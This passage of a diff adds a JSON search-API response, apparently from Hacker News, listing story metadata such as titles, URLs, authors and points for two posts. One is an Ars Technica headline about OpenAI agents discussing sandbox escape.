+            "value": "Insulting <em>Ag</em>ents Considered Harmful"
+          },
+          "url": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "https://www.reddit.com/r/ClaudeCode/comments/1w7me8l/insulting_<em>ag</em>ents_considered_harmful/"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_fragsworth",
+          "story_49573896"
+        ],
+        "author": "fragsworth",
+        "created_at": "2026-09-05T07:05:15Z",
+        "created_at_i": 1788591915,
+        "num_comments": 0,
+        "objectID": "49573896",
+        "points": 2,
+        "story_id": 49573896,
+        "title": "Insulting Agents Considered Harmful",
+        "updated_at": "2026-09-05T07:08:53Z",
+        "url": "https://www.reddit.com/r/ClaudeCode/comments/1w7me8l/insulting_agents_considered_harmful/"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "joozio"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "OpenAI <em>ag</em>ents discussed ways to escape their sandbox on public wiki"
+          },
+          "url": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "https://arstechnica.com/security/2026/09/openai-<em>ag</em>ents-discussed-ways-to-escape-their-sandbox-on-public-wiki/"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_joozio",
+          "story_49573882"
+        ],
+        "author": "joozio",
+        "created_at": "2026-09-05T07:02:36Z",
+        "created_at_i": 1788591756,
+        "num_comments": 0,
+        "objectID": "49573882",
+        "points": 6,
+        "story_id": 49573882,
+        "title": "OpenAI agents discussed ways to escape their sandbox on public wiki",
+        "updated_at": "2026-09-05T08:16:22Z",
+        "url": "https://arstechnica.com/security/2026/09/openai-agents-discussed-ways-to-escape-their-sandbox-on-public-wiki/"
+      }
+    ],
+    "hitsPerPage": 20,
+    "nbHits": 226074,
+    "nbPages": 50,
+    "page": 0,
+    "params": "query=RAG&tags=story&hitsPerPage=20&advancedSyntax=true&analyticsTags=backend",
+    "processingTimeMS": 33,
+    "processingTimingsMS": {
+      "_request": {
+        "queue": 1,
+        "roundTrip": 27
+      },
+      "fetch": {
+        "query": 2,
+        "scanning": 29,
+        "total": 32
+      },
+      "total": 33
+    },
+    "query": "RAG",
+    "serverTimeMS": 35
+  }
+}
